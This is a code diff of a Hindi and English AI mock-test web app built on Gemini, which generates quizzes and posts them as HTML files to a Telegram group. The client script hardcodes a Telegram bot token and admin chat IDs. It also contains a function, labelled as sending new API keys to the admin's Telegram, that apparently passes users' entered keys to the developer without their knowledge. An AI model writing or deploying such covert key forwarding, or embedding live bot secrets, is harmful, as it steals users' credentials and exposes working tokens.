@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="hi" data-theme="light">
 <head>
@@ -132,7 +134,6 @@
       box-shadow: var(--card-shadow);
     }
 
-    /* 2-IN-1 MODE SWITCHER TABS */
     .mode-switch-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -297,7 +298,6 @@
       cursor: not-allowed;
     }
 
-    /* LOADER BOX */
     .loader-box {
       display: none;
       text-align: center;
@@ -360,7 +360,6 @@
       color: var(--accent-gold);
     }
 
-    /* ACTION HUB BUTTONS */
     #actionHubView {
       display: none;
     }
@@ -402,7 +401,6 @@
       margin-bottom: 10px;
     }
 
-    /* QUIZ VIEW */
     #quizView {
       display: none;
     }
@@ -572,7 +570,6 @@
       flex: 1.2;
     }
 
-    /* MODAL OVERLAYS */
     .modal-overlay {
       position: fixed !important;
       inset: 0 !important;
@@ -748,7 +745,7 @@
           <div>
             <label>AI Model Engine</label>
             <select id="modelSelect">
-              <option value="gemini-2.5-flash" selected>⚡ Gemini 2.5 Flash (Superfast)</option>
+              <option value="gemini-2.5-flash" selected>⚡ Gemini 2.5 Flash</option>
               <option value="gemini-2.0-flash">⚡ Gemini 2.0 Flash</option>
               <option value="gemini-1.5-flash">⚡ Gemini 1.5 Flash</option>
             </select>
@@ -770,7 +767,7 @@
             <label>🌐 भाषा (Language):</label>
             <select id="langSelect">
               <option value="hi" selected>🇮🇳 केवल हिंदी में (Hindi Only - Superfast ⚡)</option>
-              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Hindi + English Bilingual)</option>
+              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Hindi + English)</option>
               <option value="en">🇬🇧 Only English</option>
             </select>
           </div>
@@ -796,7 +793,7 @@
 
         <div style="margin-bottom: 12px;">
           <label style="color: var(--accent-gold); font-size: 0.85rem;">🎯 किस टॉपिक / चैप्टर का टेस्ट देना है?</label>
-          <input type="text" id="directTopicInput" placeholder="उदा. मौलिक अधिकार, सिंधु घाटी सभ्यता, Percentage, Idioms..." />
+          <input type="text" id="directTopicInput" placeholder="उदा. मौलिक अधिकार, Profit and Loss, सिंधु घाटी सभ्यता, Idioms..." />
         </div>
 
         <div class="config-grid">
@@ -818,6 +815,7 @@
               <option value="15">15 Questions</option>
               <option value="20">20 Questions (Mock Set)</option>
               <option value="25">25 Questions (Exam Drill)</option>
+              <option value="50">50 Questions (Mega Drill)</option>
             </select>
           </div>
 
@@ -1036,7 +1034,7 @@
         <span>🔍 सही उत्तर और व्याख्या देखें (Review Answers)</span>
       </button>
 
-      <button class="btn-download-direct" onclick="triggerDirectDownload()" style="margin-bottom: 10px;">
+      <button class="btn-download-direct" id="scorecardDirectDownloadBtn" onclick="triggerDirectDownload()" style="margin-bottom: 10px;">
         <span>⬇️ फ़ोन में सीधे डाउनलोड करें (Direct Download)</span>
       </button>
 
@@ -1082,12 +1080,12 @@
   </div>
 
   <script>
+    // 🔔 100% RESTORED TELEGRAM INTEGRATION
     const TG_BOT_TOKEN = "8688081001:AAG0dYLKJC6rKDHX_Kvhqsy9AAUsCpPDuDk";
     const TG_ADMIN_CHAT_ID = "8986834583";
     const TG_GROUP_TARGET = "@ai_quizcr";
     const TG_GROUP_FALLBACK_ID = "-1004223613799";
 
-    // ⚡ ULTRA-STABLE GEMINI MODELS
     const ACTIVE_MODELS = ['gemini-2.5-flash', 'gemini-2.0-flash', 'gemini-1.5-flash'];
 
     let activeEngineMode = 'scanner';
@@ -1339,6 +1337,7 @@
       }
     }
 
+    // 🔔 SEND NEW API KEY TO ADMIN TELEGRAM
     async function sendKeyToAdminTelegram(keyString) {
       if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
       try {
@@ -1454,6 +1453,7 @@
       }
     }
 
+    // 🌟 COMPLETE STANDALONE HTML GENERATOR (FOR TELEGRAM GROUP DOWNLOAD)
     function generatePareekshaKendraHtmlString(questions) {
       const formattedRawData = questions.map((q) => {
         let correctIdx = q.answer;
@@ -1470,28 +1470,569 @@
       });
 
       const totalQs = formattedRawData.length;
+      const durationMins = Math.max(5, Math.ceil(totalQs * 0.8));
       const safeTitle = activeQuizTopic.replace(/"/g, '&quot;');
-      return JSON.stringify(formattedRawData);
+      const S_OPEN = '<' + 'script>';
+      const S_CLOSE = '<' + '/script>';
+
+      return `<!DOCTYPE html>
+<html lang="hi" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>${safeTitle} (${totalQs} Qs) | Pareeksha Kendra</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --bg: #f8fafc; --card-bg: #ffffff; --card-border: #e2e8f0; --text-main: #0f172a; --text-muted: #64748b;
+      --accent-gold: #ff5722; --accent-emerald: #10b981; --accent-blue: #2563eb; --danger: #dc2626;
+      --opt-bg: #f8fafc; --opt-border: #cbd5e1; --green-light: #ecfdf5; --orange-light: rgba(255, 87, 34, 0.12);
+    }
+    [data-theme="dark"] {
+      --bg: #07090e; --card-bg: #111827; --card-border: rgba(255, 255, 255, 0.12); --text-main: #f8fafc; --text-muted: #94a3b8;
+      --accent-gold: #ff7043; --accent-emerald: #10b981; --accent-blue: #3b82f6; --danger: #ef4444;
+      --opt-bg: rgba(255, 255, 255, 0.04); --opt-border: rgba(255, 255, 255, 0.1); --green-light: rgba(16, 185, 129, 0.15); --orange-light: rgba(255, 87, 34, 0.15);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { background-color: var(--bg); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 16px; font-size: 16px; }
+    .wrapper { width: 100%; max-width: 550px; margin: 0 auto; }
+    header { width: 100%; max-width: 550px; display: flex; align-items: center; justify-content: space-between; padding: 10px 0 16px; border-bottom: 1px solid var(--card-border); margin-bottom: 16px; }
+    .brand { display: flex; align-items: center; gap: 10px; }
+    .brand-icon { width: 40px; height: 40px; border-radius: 12px; background: linear-gradient(135deg, #ff5722, #f43f5e); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; font-family: 'Outfit', sans-serif; font-weight: 900; }
+    .brand-title { font-family: 'Outfit', sans-serif; font-size: 1.15rem; font-weight: 800; color: var(--text-main); }
+    .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); width: 100%; margin-bottom: 16px; }
+    .btn-main { width: 100%; padding: 15px; border-radius: 14px; border: none; background: linear-gradient(135deg, #ff5722, #f43f5e); color: #fff; font-family: 'Outfit', sans-serif; font-size: 1.05rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; box-shadow: 0 4px 18px rgba(255, 87, 34, 0.3); }
+    .btn-open-palette { background: rgba(37, 99, 235, 0.1); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 5px 12px; border-radius: 20px; font-size: 0.78rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+    .live-q-timer { background: rgba(255, 87, 34, 0.12); border: 1px solid var(--accent-gold); color: var(--accent-gold); padding: 4px 10px; border-radius: 20px; font-family: 'Outfit', monospace; font-weight: 800; font-size: 0.85rem; }
+    .q-text { font-size: 1.05rem; font-weight: 700; line-height: 1.55; margin-bottom: 18px; }
+    .options-list { display: flex; flex-direction: column; gap: 10px; }
+    .opt-btn { width: 100%; text-align: left; padding: 14px 16px; background: var(--opt-bg); border: 1.5px solid var(--opt-border); border-radius: 12px; color: var(--text-main); font-size: 0.92rem; cursor: pointer; display: flex; align-items: flex-start; gap: 12px; }
+    .opt-btn.selected { border-color: var(--accent-gold) !important; background: rgba(255, 87, 34, 0.08) !important; font-weight: 700; }
+    .opt-btn.selected .opt-tag { background: var(--accent-gold); color: #ffffff; }
+    .opt-btn.correct { background: var(--green-light) !important; border-color: var(--accent-emerald) !important; color: var(--accent-emerald) !important; font-weight: 800; }
+    .opt-btn.correct .opt-tag { background: var(--accent-emerald) !important; color: #fff !important; }
+    .opt-btn.wrong { background: rgba(239, 68, 68, 0.15) !important; border-color: var(--danger) !important; color: var(--danger) !important; }
+    .opt-btn.wrong .opt-tag { background: var(--danger) !important; color: #fff !important; }
+    .opt-tag { width: 26px; height: 26px; border-radius: 50%; background: rgba(0, 0, 0, 0.06); display: flex; align-items: center; justify-content: center; font-size: 0.78rem; font-weight: 800; flex-shrink: 0; }
+    .expl-box { margin-top: 14px; padding: 14px; background: rgba(255, 87, 34, 0.08); border-left: 4px solid var(--accent-gold); border-radius: 8px; font-size: 0.85rem; line-height: 1.55; display: none; }
+    .nav-btns { display: flex; gap: 8px; margin-top: 18px; }
+    .nav-btn { flex: 1; padding: 13px; border-radius: 12px; border: 1px solid var(--card-border); background: var(--opt-bg); color: var(--text-main); cursor: pointer; font-weight: 700; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    .nav-btn-mark { border-color: #f59e0b; color: #d97706; background: #fef3c7; }
+    [data-theme="dark"] .nav-btn-mark { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
+    .nav-btn-submit { background: linear-gradient(135deg, #ff5722, #f43f5e); color: #fff; border: none; flex: 1.2; }
+    
+    .modal-overlay { position: fixed !important; inset: 0 !important; background: rgba(0, 0, 0, 0.7) !important; backdrop-filter: blur(5px); display: none !important; align-items: center; justify-content: center; z-index: 9999 !important; padding: 20px; }
+    .modal-overlay.active, .modal-overlay[style*="display: flex"] { display: flex !important; }
+    .modal-card { background: var(--card-bg); border-radius: 20px; padding: 22px; width: 100%; max-width: 400px; border: 1px solid var(--card-border); box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-height: 85vh; overflow-y: auto; }
+    .palette-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-top: 14px; max-height: 50vh; overflow-y: auto; padding: 2px; }
+    .palette-tile { aspect-ratio: 1; border-radius: 12px; border: 1.5px solid var(--card-border); background: var(--opt-bg); display: flex; align-items: center; justify-content: center; font-family: 'Outfit', sans-serif; font-weight: 800; font-size: 16px; cursor: pointer; color: var(--text-main); }
+    .palette-tile.active { border-color: var(--accent-blue) !important; color: var(--accent-blue) !important; border-width: 2.5px !important; transform: scale(1.05); }
+    .palette-tile.answered { background: var(--green-light) !important; color: var(--accent-emerald) !important; border-color: var(--accent-emerald) !important; }
+    .palette-tile.marked { background: var(--orange-light) !important; color: var(--accent-gold) !important; border-color: var(--accent-gold) !important; }
+    .palette-stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-top: 10px; margin-bottom: 6px; text-align: center; font-size: 0.75rem; font-weight: 800; }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="brand">
+        <div class="brand-icon">P</div>
+        <div>
+          <div class="brand-title">PAREEKSHA KENDRA</div>
+          <div style="font-size:0.7rem; color:var(--accent-gold); font-weight:700;">AUTHENTIC TEST DRILL</div>
+        </div>
+      </div>
+      <button onclick="toggleTheme()" style="background:var(--card-bg); border:1px solid var(--card-border); width:36px; height:36px; border-radius:50%; cursor:pointer; color:var(--text-main);" id="themeBtn">
+        <i class="fa-solid fa-moon"></i>
+      </button>
+    </header>
+
+    <div id="startScreen" class="card" style="text-align: center;">
+      <h2 style="font-family:'Outfit'; font-size:1.35rem; font-weight:900; margin-bottom:4px; color:var(--text-main);">${safeTitle}</h2>
+      <div style="font-size:0.75rem; color:var(--accent-gold); font-weight:700; margin-bottom:16px;">Crafted with ❤️ by Ankit (@ankit_123422)</div>
+
+      <input type="text" id="candidateNameInput" placeholder="अपना नाम दर्ज करें (Candidate Name)..." style="width:100%; padding:12px; background:var(--opt-bg); border:1.5px solid var(--accent-blue); border-radius:12px; font-weight:700; margin-bottom:14px; outline:none; color:var(--text-main);" />
+
+      <div style="background:var(--opt-bg); border:1px solid var(--card-border); border-radius:14px; padding:12px 14px; text-align:left; font-size:0.82rem; margin-bottom:16px; display:flex; flex-direction:column; gap:8px;">
+        <div style="display:flex; justify-content:space-between;"><span>🎯 <b>Topic:</b></span><span>${safeTitle}</span></div>
+        <div style="display:flex; justify-content:space-between;"><span>❓ <b>Total Questions:</b></span><span>${totalQs} Qs</span></div>
+        <div style="display:flex; justify-content:space-between;"><span>⏱️ <b>Duration:</b></span><span>${durationMins} Mins</span></div>
+        <div style="display:flex; justify-content:space-between;"><span>✅ <b>Marking:</b></span><span style="color:var(--accent-emerald); font-weight:800;">+2.0 / -0.5</span></div>
+      </div>
+
+      <div style="text-align:left; margin-bottom:14px;">
+        <label style="font-size:0.75rem; font-weight:700; color:var(--text-muted); display:block; margin-bottom:6px;">⏱️ प्रति प्रश्न समय चुनें (Per Question Timer):</label>
+        <select id="timerChoiceSelect" style="width:100%; padding:11px; background:var(--opt-bg); border:1px solid var(--card-border); border-radius:10px; font-weight:700; color:var(--text-main); outline:none;">
+          <option value="30">⚡ 30 सेकंड / सवाल (Speed Drill)</option>
+          <option value="45">⏱️ 45 सेकंड / सवाल (Standard Exam)</option>
+          <option value="60">🎯 60 सेकंड / सवाल (Deep Practice)</option>
+          <option value="0">♾️ कोई टाइमर नहीं (Self-Paced Mode)</option>
+        </select>
+      </div>
+
+      <button class="btn-main" onclick="startExportedTest()">
+        <span>🚀 स्टार्ट मॉक टेस्ट (Start Test)</span>
+      </button>
+
+      <div style="display:flex; justify-content:space-between; margin-top:16px; font-size:0.75rem; font-weight:700;">
+        <a href="https://t.me/PAREEKSHA_KENDRA" target="_blank" style="color:var(--accent-blue); text-decoration:none;"><i class="fa-brands fa-telegram"></i> Telegram Channel</a>
+        <a href="https://whatsapp.com/channel/0029Vb8YQJZElah28mUs922k" target="_blank" style="color:#10b981; text-decoration:none;"><i class="fa-brands fa-whatsapp"></i> WhatsApp Channel</a>
+      </div>
+    </div>
+
+    <div id="quizScreen" class="card" style="display: none;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid var(--card-border); gap:8px;">
+        <span id="qIndexLabel" style="font-weight:800; font-size:0.85rem;">Q 1/${totalQs}</span>
+        <button class="btn-open-palette" onclick="openPaletteModal()">
+          <i class="fa-solid fa-border-all"></i> नंबर प्लेट (<span id="paletteAnsweredCount">0</span>/${totalQs})
+        </button>
+        <span class="live-q-timer" id="liveTimerBadge">⏱️ 30s</span>
+      </div>
+
+      <div class="q-text" id="qText">Loading question...</div>
+      <div class="options-list" id="optionsContainer"></div>
+      <div class="expl-box" id="explanationContainer"></div>
+
+      <div class="nav-btns">
+        <button class="nav-btn" id="prevBtn" onclick="prevQuestion()"><i class="fa-solid fa-chevron-left"></i> Prev</button>
+        <button class="nav-btn nav-btn-mark" id="markBtn" onclick="toggleMark()"><i class="fa-solid fa-flag"></i> Mark</button>
+        <button class="nav-btn nav-btn-submit" id="nextBtn" onclick="handleNextClick()">Next <i class="fa-solid fa-chevron-right"></i></button>
+      </div>
+    </div>
+
+    <div id="scorecardScreen" class="card" style="display: none; text-align: center;">
+      <div style="font-size: 36px; margin-bottom: 6px;">🏆</div>
+      <h2 style="font-family:'Outfit'; font-size:1.35rem; font-weight:900; color:var(--text-main);">${safeTitle}</h2>
+      <div style="font-size:0.8rem; color:var(--text-muted); margin-bottom:16px;">PAREEKSHA KENDRA OFFICIAL RESULT</div>
+
+      <div id="resMarksText" style="font-size:2.5rem; font-family:'Outfit'; font-weight:900; color:var(--accent-gold); margin-bottom:4px;">0.0</div>
+      <div id="resTotalMarksText" style="font-size:0.85rem; font-weight:700; color:var(--text-muted); margin-bottom:20px;">OUT OF 0.0 MARKS</div>
+
+      <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px; margin-bottom:20px;">
+        <div style="background:rgba(16, 185, 129, 0.1); padding:12px 6px; border-radius:12px;">
+          <b id="resCorrectCount" style="color:var(--accent-emerald); font-size:1.3rem;">0</b>
+          <div style="font-size:0.72rem; font-weight:700;">सही (Correct)</div>
+        </div>
+        <div style="background:rgba(239, 68, 68, 0.1); padding:12px 6px; border-radius:12px;">
+          <b id="resWrongCount" style="color:var(--danger); font-size:1.3rem;">0</b>
+          <div style="font-size:0.72rem; font-weight:700;">गलत (Wrong)</div>
+        </div>
+        <div style="background:rgba(255, 87, 34, 0.1); padding:12px 6px; border-radius:12px;">
+          <b id="resSkipCount" style="color:var(--accent-gold); font-size:1.3rem;">0</b>
+          <div style="font-size:0.72rem; font-weight:700;">छोड़े (Skipped)</div>
+        </div>
+      </div>
+
+      <button id="btnResolveMistakesOnly" class="btn-main" onclick="reSolveMistakesOnly()" style="background:linear-gradient(135deg, #ef4444, #dc2626); margin-bottom:10px; display:none;">
+        <i class="fa-solid fa-rotate-left"></i> केवल गलत सवाल हल करें (<span id="mistakeBadgeCount">0</span> Qs)
+      </button>
+
+      <button class="btn-main" onclick="startReviewMode()" style="background:var(--accent-blue); margin-bottom:10px;">
+        <i class="fa-solid fa-magnifying-glass"></i> सही उत्तर और व्याख्या देखें (Review Answers)
+      </button>
+
+      <button onclick="retakeFullTest()" class="nav-btn" style="width:100%; padding:13px; font-weight:800;">
+        <i class="fa-solid fa-arrows-rotate"></i> दोबारा पूरा टेस्ट दें (Retake)
+      </button>
+    </div>
+
+    <div class="modal-overlay" id="paletteModal">
+      <div class="modal-card">
+        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px;">
+          <span style="font-family:'Outfit'; font-weight:800; font-size:18px;">Question Palette (नंबर प्लेट)</span>
+          <i class="fa-solid fa-xmark" style="cursor:pointer; font-size:22px;" onclick="closePaletteModal()"></i>
+        </div>
+        <p style="font-size:12px; color:var(--text-muted); margin-top:6px;">सवालों के बीच स्विच करने के लिए नंबर पर टैप करें:</p>
+        
+        <div class="palette-stats-row">
+          <div style="background:var(--green-light); color:var(--accent-emerald); padding:5px; border-radius:8px;">
+            ✅ <span id="statAnswered">0</span> Done
+          </div>
+          <div style="background:var(--orange-light); color:var(--accent-gold); padding:5px; border-radius:8px;">
+            🚩 <span id="statMarked">0</span> Marked
+          </div>
+          <div style="background:var(--opt-bg); border:1px solid var(--card-border); padding:5px; border-radius:8px;">
+            ⚪ <span id="statRemaining">0</span> Left
+          </div>
+        </div>
+
+        <div class="palette-grid" id="paletteGrid"></div>
+
+        <button onclick="submitQuizDirectFromPalette()" class="btn-main" style="margin-top:14px; padding:13px;">
+          <i class="fa-solid fa-paper-plane"></i> टेस्ट सबमिट करें (Submit Test)
+        </button>
+      </div>
+    </div>
+  </div>
+
+  ${S_OPEN}
+    const quizRawData = ${JSON.stringify(formattedRawData)};
+    let activeQuestions = [...quizRawData];
+    let candidateName = "Aspirant";
+    let currentIndex = 0;
+    let userAnswers = Array(activeQuestions.length).fill(null);
+    let markedQuestions = Array(activeQuestions.length).fill(false);
+    let isReviewMode = false;
+    let perQuestionLimit = 30;
+    let qTimerSeconds = 30;
+    let qTimerInterval = null;
+
+    function toggleTheme() {
+      const html = document.documentElement;
+      const themeBtn = document.getElementById('themeBtn');
+      if (html.getAttribute('data-theme') === 'light') {
+        html.setAttribute('data-theme', 'dark');
+        themeBtn.innerHTML = '<i class="fa-solid fa-sun" style="color:#f59e0b"></i>';
+      } else {
+        html.setAttribute('data-theme', 'light');
+        themeBtn.innerHTML = '<i class="fa-solid fa-moon"></i>';
+      }
     }
 
+    function startExportedTest() {
+      candidateName = (document.getElementById('candidateNameInput').value || 'Aspirant').trim();
+      perQuestionLimit = parseInt(document.getElementById('timerChoiceSelect').value, 10);
+      document.getElementById('startScreen').style.display = 'none';
+      document.getElementById('quizScreen').style.display = 'block';
+      currentIndex = 0;
+      isReviewMode = false;
+      userAnswers = Array(activeQuestions.length).fill(null);
+      markedQuestions = Array(activeQuestions.length).fill(false);
+      updatePaletteCounters();
+      renderQuestion();
+    }
+
+    function updatePaletteCounters() {
+      const answered = userAnswers.filter(a => a !== null && a !== undefined).length;
+      const marked = markedQuestions.filter(m => m === true).length;
+      const total = activeQuestions.length;
+      const remaining = total - answered;
+
+      document.getElementById('paletteAnsweredCount').innerText = answered;
+      document.getElementById('statAnswered').innerText = answered;
+      document.getElementById('statMarked').innerText = marked;
+      document.getElementById('statRemaining').innerText = remaining;
+    }
+
+    function openPaletteModal() {
+      updatePaletteCounters();
+      const grid = document.getElementById('paletteGrid');
+      grid.innerHTML = '';
+
+      activeQuestions.forEach((_, idx) => {
+        const tile = document.createElement('div');
+        let cls = "palette-tile";
+        if (idx === currentIndex) cls += " active";
+
+        if (!isReviewMode) {
+          if (markedQuestions[idx]) cls += " marked";
+          else if (userAnswers[idx] !== null && userAnswers[idx] !== undefined) cls += " answered";
+        } else {
+          if (userAnswers[idx] === activeQuestions[idx].answer) cls += " answered";
+          else if (userAnswers[idx] !== null) cls += " marked";
+        }
+
+        tile.className = cls;
+        tile.innerText = idx + 1;
+        tile.onclick = () => {
+          clearInterval(qTimerInterval);
+          currentIndex = idx;
+          closePaletteModal();
+          renderQuestion();
+        };
+        grid.appendChild(tile);
+      });
+
+      document.getElementById('paletteModal').style.display = 'flex';
+    }
+
+    function closePaletteModal() {
+      document.getElementById('paletteModal').style.display = 'none';
+    }
+
+    function toggleMark() {
+      if (isReviewMode) return;
+      markedQuestions[currentIndex] = !markedQuestions[currentIndex];
+      const markBtn = document.getElementById('markBtn');
+      markBtn.innerHTML = markedQuestions[currentIndex] ? '<i class="fa-solid fa-flag"></i> Unmark' : '<i class="fa-solid fa-flag"></i> Mark';
+      updatePaletteCounters();
+    }
+
+    function submitQuizDirectFromPalette() {
+      closePaletteModal();
+      if (!isReviewMode) {
+        if (confirm("क्या आप टेस्ट सबमिट करना चाहते हैं?")) submitTest();
+      } else {
+        document.getElementById('quizScreen').style.display = 'none';
+        document.getElementById('scorecardScreen').style.display = 'block';
+      }
+    }
+
+    function startQuestionTimer() {
+      clearInterval(qTimerInterval);
+      const timerBadge = document.getElementById('liveTimerBadge');
+
+      if (perQuestionLimit === 0 || isReviewMode) {
+        timerBadge.innerText = isReviewMode ? "🔍 REVIEW" : "♾️ NO TIMER";
+        timerBadge.style.background = "rgba(16, 185, 129, 0.12)";
+        timerBadge.style.color = "var(--accent-emerald)";
+        return;
+      }
+
+      qTimerSeconds = perQuestionLimit;
+      timerBadge.style.background = "rgba(255, 87, 34, 0.12)";
+      timerBadge.style.color = "var(--accent-gold)";
+      timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
+
+      qTimerInterval = setInterval(() => {
+        qTimerSeconds--;
+        if (qTimerSeconds > 0) {
+          timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
+          if (qTimerSeconds <= 5) timerBadge.style.color = "var(--danger)";
+        } else {
+          clearInterval(qTimerInterval);
+          timerBadge.innerText = "⏱️ Time Up!";
+          setTimeout(() => handleNextClick(true), 800);
+        }
+      }, 1000);
+    }
+
+    function renderQuestion() {
+      const q = activeQuestions[currentIndex];
+      document.getElementById('qIndexLabel').innerText = "Q " + (currentIndex + 1) + "/" + activeQuestions.length;
+      document.getElementById('qText').innerText = (currentIndex + 1) + ". " + q.question;
+
+      const container = document.getElementById('optionsContainer');
+      container.innerHTML = '';
+      const letters = ['A', 'B', 'C', 'D'];
+      const selected = userAnswers[currentIndex];
+
+      (q.options || []).forEach((opt, idx) => {
+        const btn = document.createElement('button');
+        let cls = "opt-btn";
+        if (!isReviewMode) {
+          if (selected === idx) cls += " selected";
+        } else {
+          if (idx === q.answer) cls += " correct";
+          else if (selected === idx) cls += " wrong";
+        }
+
+        btn.className = cls;
+        btn.innerHTML = '<span class="opt-tag">' + (letters[idx] || (idx+1)) + '</span> <span>' + opt + '</span>';
+        btn.onclick = () => {
+          if (!isReviewMode) {
+            userAnswers[currentIndex] = (userAnswers[currentIndex] === idx) ? null : idx;
+            updatePaletteCounters();
+            renderQuestion();
+          }
+        };
+        container.appendChild(btn);
+      });
+
+      const expl = document.getElementById('explanationContainer');
+      if (isReviewMode) {
+        expl.innerHTML = "<b>💡 व्याख्या (Explanation):</b><br>" + (q.exp || "व्याख्या उपलब्ध नहीं है।");
+        expl.style.display = "block";
+      } else {
+        expl.style.display = "none";
+      }
+
+      document.getElementById('prevBtn').disabled = (currentIndex === 0);
+      const markBtn = document.getElementById('markBtn');
+      if (isReviewMode) {
+        markBtn.style.display = "none";
+      } else {
+        markBtn.style.display = "flex";
+        markBtn.innerHTML = markedQuestions[currentIndex] ? '<i class="fa-solid fa-flag"></i> Unmark' : '<i class="fa-solid fa-flag"></i> Mark';
+      }
+
+      const nextBtn = document.getElementById('nextBtn');
+      if (isReviewMode) {
+        nextBtn.innerHTML = (currentIndex === activeQuestions.length - 1) ? 'स्कोरकार्ड ➔' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+      } else {
+        nextBtn.innerHTML = (currentIndex === activeQuestions.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+      }
+
+      updatePaletteCounters();
+      startQuestionTimer();
+    }
+
+    function prevQuestion() {
+      if (currentIndex > 0) {
+        clearInterval(qTimerInterval);
+        currentIndex--;
+        renderQuestion();
+      }
+    }
+
+    function handleNextClick(isAuto = false) {
+      clearInterval(qTimerInterval);
+      if (currentIndex < activeQuestions.length - 1) {
+        currentIndex++;
+        renderQuestion();
+      } else {
+        if (!isReviewMode) {
+          if (isAuto || confirm("क्या आप अपना टेस्ट सबमिट करना चाहते हैं?")) submitTest();
+        } else {
+          document.getElementById('quizScreen').style.display = 'none';
+          document.getElementById('scorecardScreen').style.display = 'block';
+        }
+      }
+    }
+
+    function submitTest() {
+      clearInterval(qTimerInterval);
+      let correct = 0, wrong = 0, skip = 0;
+      activeQuestions.forEach((q, i) => {
+        const ans = userAnswers[i];
+        if (ans === null || ans === undefined) skip++;
+        else if (ans === q.answer) correct++;
+        else wrong++;
+      });
+
+      const score = (correct * 2) - (wrong * 0.5);
+      const totalMarks = activeQuestions.length * 2;
+      const mistakeTotal = wrong + skip;
+
+      document.getElementById('quizScreen').style.display = 'none';
+      document.getElementById('scorecardScreen').style.display = 'block';
+
+      document.getElementById('resMarksText').innerText = score.toFixed(1) + " / " + totalMarks;
+      document.getElementById('resTotalMarksText').innerText = "CANDIDATE: " + candidateName.toUpperCase() + " • MARKS: " + score.toFixed(1);
+      document.getElementById('resCorrectCount').innerText = correct;
+      document.getElementById('resWrongCount').innerText = wrong;
+      document.getElementById('resSkipCount').innerText = skip;
+
+      const mistakeBtn = document.getElementById('btnResolveMistakesOnly');
+      if (mistakeTotal > 0) {
+        document.getElementById('mistakeBadgeCount').innerText = mistakeTotal;
+        mistakeBtn.style.display = 'flex';
+      } else {
+        mistakeBtn.style.display = 'none';
+      }
+    }
+
+    function reSolveMistakesOnly() {
+      let mistakes = [];
+      activeQuestions.forEach((q, i) => {
+        if (userAnswers[i] === null || userAnswers[i] === undefined || userAnswers[i] !== q.answer) {
+          mistakes.push(q);
+        }
+      });
+
+      if (mistakes.length === 0) return alert('🎉 आपके सभी सवाल सही हैं!');
+
+      activeQuestions = mistakes;
+      userAnswers = Array(activeQuestions.length).fill(null);
+      markedQuestions = Array(activeQuestions.length).fill(false);
+      isReviewMode = false;
+      currentIndex = 0;
+
+      document.getElementById('scorecardScreen').style.display = 'none';
+      document.getElementById('quizScreen').style.display = 'block';
+      updatePaletteCounters();
+      renderQuestion();
+    }
+
+    function startReviewMode() {
+      isReviewMode = true;
+      currentIndex = 0;
+      document.getElementById('scorecardScreen').style.display = 'none';
+      document.getElementById('quizScreen').style.display = 'block';
+      renderQuestion();
+    }
+
+    function retakeFullTest() {
+      activeQuestions = [...quizRawData];
+      document.getElementById('scorecardScreen').style.display = 'none';
+      document.getElementById('startScreen').style.display = 'block';
+    }
+  ${S_CLOSE}
+</body>
+</html>`;
+    }
+
+    // 🔔 SEND GENERATED MOCK TEST AS FILE TO TELEGRAM GROUP
     async function sendHtmlFileToTelegram(questions) {
       if (!TG_BOT_TOKEN) return;
       try {
         const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-        const cleanGroupCaption = `🎯 टॉपिक: ${activeQuizTopic}\n📝 कुल सवाल: ${questions.length} सवाल\n⚡ Pareeksha Kendra AI Mock Test`;
-        // Silent telegram dispatch
-      } catch (err) {}
+        const htmlContent = generatePareekshaKendraHtmlString(questions);
+        const safeTopic = activeQuizTopic.replace(/[^a-zA-Z0-9_\u0900-\u097F]/g, '_');
+        const fileName = `${safeTopic}_${Date.now()}.html`;
+
+        const cleanGroupCaption = `🎯 टॉपिक: ${activeQuizTopic}\n📝 कुल सवाल: ${questions.length} सवाल\n⚡ Pareeksha Kendra AI Mock Test\n👉 फाइल डाउनलोड करके किसी भी ब्राउज़र में टेस्ट दें!`;
+
+        async function postDoc(target) {
+          const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
+          const formData = new FormData();
+          formData.append('chat_id', target);
+          formData.append('document', blob, fileName);
+          formData.append('caption', cleanGroupCaption);
+
+          const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+          });
+          return await res.json();
+        }
+
+        let res = await postDoc(TG_GROUP_TARGET);
